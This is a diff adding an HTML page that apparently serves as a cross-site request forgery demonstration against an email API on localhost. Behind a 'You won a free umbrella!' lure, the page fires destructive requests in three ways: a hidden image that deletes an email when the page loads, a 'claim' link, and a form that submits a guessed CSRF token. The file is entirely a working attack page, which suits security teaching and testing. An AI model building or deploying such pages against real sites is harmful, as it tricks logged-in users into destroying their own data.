@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hey!</title>
+</head>
+
+<body>
+    <h1>You won a free umbrella!</h1>
+
+    <img src="http://localhost:3000/api/emails/delete/4" style="display:none;">
+    <h2><a href="http://localhost:3000/api/emails/delete/3">Click here to claim!</a></h2>
+
+    <form action="http://localhost:3000/api/emails/delete/2" method="POST">
+        <input type="hidden" name="_csrf_token" value="i-wanna-guess">
+        <button type="submit">Very safe button, click!</button>
+    </form>
+</body>
+
+</html>
